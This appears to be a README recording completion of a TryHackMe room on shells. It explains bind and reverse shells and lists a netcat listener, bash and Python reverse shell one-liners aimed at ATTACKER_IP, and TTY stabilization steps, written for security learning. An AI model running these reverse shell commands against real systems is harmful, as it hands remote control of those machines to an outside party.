# 🐚 Shells Overview — TryHackMe (Final Version)

## 📌 Overview

This repository documents the completion of the **"Shells Overview"** room on TryHackMe.

All tasks (1–9) have been successfully completed. This room provided a solid foundation in understanding shell types, how they work, and how they are used during offensive security engagements.

Shell knowledge is fundamental for **post-exploitation, privilege escalation, and lateral movement**.

---

## 🎯 Learning Objectives Achieved

✔ Understand what a shell is
✔ Differentiate between bind and reverse shells
✔ Learn how shells are obtained during exploitation
✔ Understand common shell payloads
✔ Practice shell listeners and connections
✔ Learn basic shell stabilization techniques

---

## 🧠 What is a Shell?

A **shell** allows interaction with an operating system through command execution.

In offensive security, a shell is typically obtained after exploiting a vulnerability and provides remote command execution on the target system.

Shell access often represents the transition from **initial access** to **post-exploitation**.

---

## 🔁 Types of Shells

### 🔓 Bind Shell

* The target opens a listening port.
* The attacker connects to that port.

```
Attacker  --->  Target (Listening Port)
```

❗ Less common in real-world attacks due to firewall restrictions.

---

### 🔄 Reverse Shell

* The attacker sets up a listener.
* The target connects back to the attacker.

```
Target  --->  Attacker (Listening)
```

✔ More common in real-world engagements
✔ Bypasses many inbound firewall rules

---

## 🛠️ Common Shell Tools & Payloads

### Netcat Listener

```bash
nc -lvnp 4444
```

### Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Python Reverse Shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## 🧩 Shell Stabilization

Raw shells are often unstable and lack full terminal functionality.

### Upgrade to a Fully Interactive TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then on attacker machine:

```bash
Ctrl + Z
stty raw -echo
fg
export TERM=xterm
```

This enables:

* Proper tab completion
* Clear command output
* Better interactive experience

---

## 🧠 Additional Concepts Covered

* Difference between interactive and non-interactive shells
* File descriptor redirection (`0>&1`, `2>&1`)
* Listener configuration
* Basic networking awareness for shell connections

---

## 🔐 Security Relevance (Red Team Perspective)

Obtaining a shell is often the **primary objective after exploitation**.

With shell access, an attacker can:

* Enumerate users and services
* Search for sensitive files
* Escalate privileges
* Pivot to internal systems
* Maintain persistence

Shell mastery is essential for:

* Red Team operations
* Capture The Flag (CTF) competitions
* Real-world penetration testing

---

## 🏁 Room Completion Status

* ✅ Tasks 1–9 completed
* 🧠 Practical understanding of shell behavior achieved

---

